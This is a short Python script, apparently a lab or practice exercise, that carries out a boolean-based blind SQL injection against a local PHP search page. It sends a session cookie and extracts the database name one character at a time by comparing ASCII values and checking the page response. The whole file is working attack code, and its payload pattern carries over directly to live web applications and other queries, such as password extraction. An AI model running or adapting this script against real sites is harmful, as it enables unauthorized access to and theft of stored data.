from time import sleep
import requests

url = "http://localhost/Nclass/site/search.php"
cookies={'PHPSESSID':'agm8rneppc42oj4bv3p7rlgabq'}

data_str=''
len = 8
for position in range(1,len+1):
    for find_pw in range(33,127):
        payload = "hi'and (ascii(substring((select database()),{},1)) ={}) and '1'='1'".format(position,find_pw)+'#'

        parameter = {'cate': 'title', 'search' : payload}

        res = requests.post( url, params=parameter, cookies=cookies)
        # sleep(1)
        if ("정승용" in res.text):
            data_str += chr(find_pw)
            print("pw=", data_str)
            break

    if("검색" not in res.text):
        break
    # print("next")
print("Found all=", data_str)